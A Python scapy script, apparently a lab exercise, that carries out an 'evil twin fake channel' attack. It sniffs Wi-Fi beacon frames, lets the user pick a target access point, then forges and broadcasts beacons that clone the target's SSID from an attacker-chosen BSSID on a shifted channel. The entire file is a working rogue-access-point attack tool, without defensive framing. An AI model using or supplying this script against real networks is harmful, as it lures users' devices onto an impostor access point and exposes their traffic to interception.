#!/bin/python3
import argparse

from scapy.all import *
from scapy.layers.dot11 import Dot11Beacon, Dot11Elt, Dot11, RadioTap

# Global variables
BSSIDs = {}  # dictionary with BSSID as the key


def packet_handler(p):
    """
    Packet handler to analyse Beacon frames and discover new AP on the network
    Display each new AP with the BSSID, signal strength, channel and SSID
    :param p: the packet to analyse
    """
    if p.haslayer(Dot11Beacon):
        # Get mac address of the AP
        bssid = p.addr2
        if bssid not in BSSIDs:
            # Try to get the signal
            try:
                signal = p.dBm_antSignal
            except:
                signal = "N/A"

            channel = p[Dot11Beacon].network_stats().get("channel")

            ssid = p.info.decode("utf-8")

            # Store and display the new BSSID
            BSSIDs[bssid] = (signal, channel, ssid)
            print("{} {:^17} {:^9} {}".format(bssid, signal, channel, ssid))


def search_ap():
    """
    Sniff for Ap's in the proximity
    :return:
    """
    print("{:<16} {} {:<2} {:<32}".format("<MAC>", "<signal strength>","<channel>","<SSID>"))
    sniff(iface=args.Interface, prn=packet_handler, timeout=args.Timeout)


def select_ap():
    """
    Ask user to choose a BSSID
    :return: the selected BSSID
    """
    userBssid = input("Please select the BSSID:\n")
    print("You selected the BSSID:", userBssid)
    return userBssid


def forge_packet(bssid):
    """
    Forge a Beacon frame based on the user selected BSSID
    :param bssid: the BSSID of the packet to forge
    :return: the forged packet
    """
    _, channel, ssid = BSSIDs[bssid]

    channel = channel + 6 if channel <= 6 else channel - 6

    # forge beacon packet
    packet = RadioTap() \
             / Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=args.BSSID, addr3=args.BSSID) \
             / Dot11Beacon(cap="ESS+privacy") \
             / Dot11Elt(ID="SSID", info=ssid, len=len(ssid)) \
             / Dot11Elt(ID="DSset", info=chr(channel))

    # show the forged packet
    print("forged packet:")
    packet.show()
    return packet


def evil_twin_fake_channel():
    """
    Perform the evil twin fake channel attack
    :return:
    """
    search_ap()
    selected_bssid = select_ap()
    forged_beacon = forge_packet(selected_bssid)
    sendp(forged_beacon, iface=args.Interface, count=args.Packets)


# Args parsing
parser = argparse.ArgumentParser(prog="Scapy Fake channel Evil Tween attack",
                                 usage="evil_twin_fake_channel.py -i wlp2s0mon -b 00:11:22:33:44:55 [-t 5 -n 10]",
                                 allow_abbrev=False)

parser.add_argument("-i", "--Interface", required=True,
                    help="The interface that you want to use, needs to be set to monitor mode")

parser.add_argument("-b", "--BSSID", required=True,
                    help="The BSSID of the evil AP for the new network", )

parser.add_argument("-t", "--Timeout", required=False, help="The time in seconds to wait before stopping the sniffing",
                    default=5)
parser.add_argument("-n", "--Packets", required=False, help="The number of packets to send", default=10)

args = parser.parse_args()

# Start the attack
evil_twin_fake_channel()
